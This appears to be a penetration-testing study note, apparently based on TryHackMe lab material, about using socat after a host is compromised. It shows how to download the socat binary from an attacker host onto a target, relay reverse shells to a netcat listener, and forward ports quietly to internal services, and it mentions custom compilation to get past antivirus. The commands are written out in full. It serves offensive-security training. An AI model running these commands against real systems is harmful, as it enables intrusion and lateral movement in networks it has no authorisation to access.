# socat

* Socat is not just great for fully stable Linux shells, it's also superb for port forwarding.
* That said, static binaries are easy to find for both Linux and Windows.
* The Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required.
* `socat` makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine.
* This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:
* ![alt text](https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png)
* Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.
* For example, with a Python webserver:-
* On Kali (inside the directory containing your Socat binary):

```
sudo python3 -m http.server 80
```

* Then, on the target:

```
curl ATTACKING_IP/socat -o /tmp/socat && chmod +x /tmp/socat
```

### Reverse Shell Relay

* Let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). Next, on the compromised server, use the following command to start the relay:

```
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
```

* From here we can then create a reverse shell to the newly opened port 8000 on the compromised server.
* ![alt text](https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png)
* A brief explanation of the above command:
* `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port `8000` of the target machine.
* `tcp:ATTACKING_IP:443` connects back to our local IP on port 443.
* `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.
* The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.

### Port Forwarding -- Easy

* The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server.
* For example, if the compromised server is `172.16.0.5` and the target is port `3306` of `172.16.0.10`, we could use the following command (on the compromised server) to create a port forward:

```
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

This opens up port `33060` on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of `172.16.0.10`.

* The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it.
* We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

### Port Forwarding -- Quiet

* This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.
* First of all, on our own attacking machine, we issue the following command:

```
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```

* This opens up two ports: `8000` and `8001`, creating a local port relay. What goes into one of them will come out of the other. For this reason, port `8000` also has the `fork` and `reuseaddr` options set, to allow us to create more than one connection using this port forward.
* Next, on the compromised relay server (`172.16.0.5` in the previous example) we execute this command:

```
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

This makes a connection between our listening port `8001` on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:

```
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```

This would create a link between port `8000` on our attacking machine, and port `80` on the intended target (`172.16.0.10`), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: `172.16.0.10:80`!

### Socat Forward Port off Printer or non ssh enabled device

* Have a compromised device that is running `cupsd` port 631, however its listening only on the loopback and the printer does not have ssh.

```
socat tcp-listen:9090,fork tcp:127.0.0.1:631 &
```

#### Killing Jobs

* Run the `jobs` command in your terminal, then kill any `socat` processes using `kill %NUMBER`
